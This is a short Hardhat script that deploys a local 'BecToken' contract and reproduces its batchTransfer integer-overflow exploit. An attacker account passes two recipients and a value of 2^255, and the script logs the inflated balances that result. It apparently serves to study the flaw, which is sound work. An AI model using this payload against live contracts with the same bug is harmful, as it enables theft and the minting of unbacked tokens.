import { ethers } from "hardhat";

async function main() {
  // deploy
  const [owner, attacker1, attacker2, attacker3] = await ethers.getSigners();
  const BecToken = await ethers.getContractFactory("BecToken");
  const becToken = await BecToken.connect(owner).deploy();
  await becToken.deployed();
  console.log(`BecToken deployed successfully. The address is ${becToken.address}`);
  console.log('BecToken totalSupply:', await becToken.totalSupply()); 
  // attack
  console.log('[before]attacker1 token num:', await becToken.balanceOf(attacker1.address));
  console.log('[before]attacker2 token num', await becToken.balanceOf(attacker2.address));
  console.log('[before]attacker3 token num', await becToken.balanceOf(attacker3.address));
  await becToken.connect(attacker1).batchTransfer([attacker2.address, attacker3.address], BigInt(2) ** BigInt(255));
  console.log('[after]attacker2 token num', await becToken.balanceOf(attacker2.address));
  console.log('[after]attacker3 token num', await becToken.balanceOf(attacker3.address));
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
